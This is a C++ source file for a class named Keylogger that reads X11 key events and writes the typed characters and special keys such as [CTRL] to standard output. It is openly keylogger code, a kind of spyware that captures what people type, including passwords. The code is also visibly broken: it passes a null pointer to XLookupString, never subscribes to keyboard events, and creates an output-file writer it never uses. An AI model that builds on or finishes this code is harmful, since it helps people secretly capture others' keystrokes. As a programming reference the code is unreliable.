#include "keylogger.h"
#include "file_writer.h"
#include <X11/keysym.h>
#include <iostream>

Keylogger::Keylogger() : display(nullptr), running(false) {
    display = XOpenDisplay(nullptr);
    if (!display) {
        std::cerr << "Unable to open X display\n";
    }
}

Keylogger::~Keylogger() {
    if (display) {
        XCloseDisplay(display);
    }
}

std::string Keylogger::key_to_string(KeySym keysym) {
    char buffer[32] = {0};
    int count = XLookupString(nullptr, buffer, sizeof(buffer), &keysym, nullptr);
    if (count > 0) {
        return std::string(buffer, count);
    }
    switch (keysym) {
        case XK_Return: return "\n";
        case XK_Tab: return "\t";
        case XK_BackSpace: return "[BACKSPACE]";
        case XK_Escape: return "[ESC]";
        case XK_Shift_L: case XK_Shift_R: return "[SHIFT]";
        case XK_Control_L: case XK_Control_R: return "[CTRL]";
        case XK_Alt_L: case XK_Alt_R: return "[ALT]";
        case XK_space: return " ";
        default: return "";
    }
}

void Keylogger::process_event(XEvent& event) {
    if (event.type == KeyPress) {
        KeySym keysym = XLookupKeysym(&event.xkey, 0);
        std::string keystr = key_to_string(keysym);
        if (!keystr.empty()) {
            std::cout << keystr;
            std::cout.flush();
        }
    }
}

void Keylogger::start(const std::string& output_file) {
    if (!display) return;

    FileWriter writer(output_file);
    running = true;
    XEvent event;

    while (running) {
        if (XPending(display) > 0) {
            XNextEvent(display, &event);
            process_event(event);
        }
    }
}

void Keylogger::stop() {
    running = false;
}